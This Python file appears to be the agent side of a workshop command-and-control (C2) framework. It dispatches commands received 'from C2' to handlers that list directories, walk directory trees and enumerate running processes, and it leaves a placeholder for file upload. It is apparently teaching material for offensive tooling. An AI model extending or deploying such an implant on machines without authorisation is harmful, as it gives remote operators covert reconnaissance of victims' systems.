import os
import psutil
from workshop.protocol.common import *


#  agent command definitions will appear here.


def handle_command(command_id, arguments):
    print(f"[+] Trying to run command handler for command {command_id}")
    if command_id not in command_id_to_command_handler:
        print(f"[-] Command {command_id} is not supported by agent")
        return MESSAGE_STATUS_ERROR, f"[-] {command_id} is not supported by agent"

    payload_handler = command_id_to_command_handler[command_id]
    if arguments:
        return payload_handler(arguments)
    else:
        return payload_handler()


def list_dir(path):
    # listing the path's files and directories (not recursive)
    if isinstance(path, bytes):
        path = path.decode()

    if not os.path.isdir(path):
        return MESSAGE_STATUS_ERROR, f"ListDir error from agent: path '{path}' doesn't exist locally"

    response = f"* ListDir path: '{path}' *\n\n"
    files = os.listdir(path)
    for file in files:
        full_path = os.path.join(path, file)
        if os.path.isfile(full_path):
            response += f"[F]\t{file}\n"
        elif os.path.isdir(full_path):
            response += f"[D]\t{file}\n"
        else:
            response += f"[O]\t{file}\n"

    response += "\n*ListDir End*\n"
    return MESSAGE_STATUS_OK, response


def walk_dir(path):
    # listing the path's files and directories (recursive)
    if isinstance(path, bytes):
        path = path.decode()

    if not os.path.isdir(path):
        return MESSAGE_STATUS_ERROR, f"WalkDir error from agent: path '{path}' doesn't exist locally"

    response = f"* WalkDir path: '{path}' *\n\n"
    # Walk through the directory and its subdirectories
    for dirpath, dirnames, filenames in os.walk(path):
        depth = dirpath.replace(path, "").count(os.sep)
        indent = "\t" * depth  # Indentation based on depth
        #  current directory
        response += f"{indent}[D] {os.path.basename(dirpath) or '.'}\n"
        for dirname in dirnames:
            response += f"{indent}\t[D] {dirname}\n"
        for filename in filenames:
            response += f"{indent}\t[F] {filename}\n"

    response += "\n*WalkDir End*\n"
    return MESSAGE_STATUS_OK, response


def list_running_processes():
    # define columns width
    pid_w = 10
    name_w = 45
    status_w = 10
    memory_w = 12
    cpu_w = 8
    error_w = 15

    response = f"* Running Processes: *\n\n"
    response += f"{'PID':<{pid_w}} {'Name':<{name_w}} {'Status':<{status_w}} {'Memory (MB)':<{memory_w}} {'CPU (%)':<{cpu_w}} {'Error':<{error_w}}\n"
    response += f"{'-' * 90}\n"

    for proc in psutil.process_iter(['pid', 'name', 'status', 'memory_info', 'cpu_percent']):
        try:
            pid = proc.info['pid']
            name = proc.info['name']
            status = proc.info['status']
            memory = proc.info['memory_info'].rss / (1024 * 1024)  # Memory usage in MB
            cpu = proc.info['cpu_percent']  # CPU usage percentage

            response += f"{pid:<{pid_w}} {name:<{name_w}} {status:<{status_w}} {memory:<{memory_w}.2f} {cpu:<{cpu_w}.2f} {'':<{error_w}}\n"
        except (psutil.NoSuchProcess, psutil.ZombieProcess):
            # Handle cases where process no longer exists
            response += f"{proc.pid:<{pid_w}} {'<NoSuchProcess>':<{name_w}} {'n/a':<{status_w}} {'n/a':<{memory_w}} {'n/a':<{cpu_w}} {proc.pid:<{error_w}}\n"
        except psutil.AccessDenied:
            # Handle processes where access is denied
            response += f"{proc.pid:<{pid_w}} {'<AccessDenied>':<{name_w}} {'n/a':<{status_w}} {'n/a':<{memory_w}} {'n/a':<{cpu_w}} {proc.pid:<{error_w}}\n"

    response += "\n*Running Processes*\n"
    return MESSAGE_STATUS_OK, response


# functions to handle the command request from C2
# receive arguments
# returns command_status, command_response
command_id_to_command_handler = {
    LISTDIR_COMMAND_ID: list_dir,
    WALKDIR_COMMAND_ID: walk_dir,
    RUNNING_PROCESSES_COMMAND_ID: list_running_processes,
    # FILE_UPLOAD_COMMAND_ID: ,
}
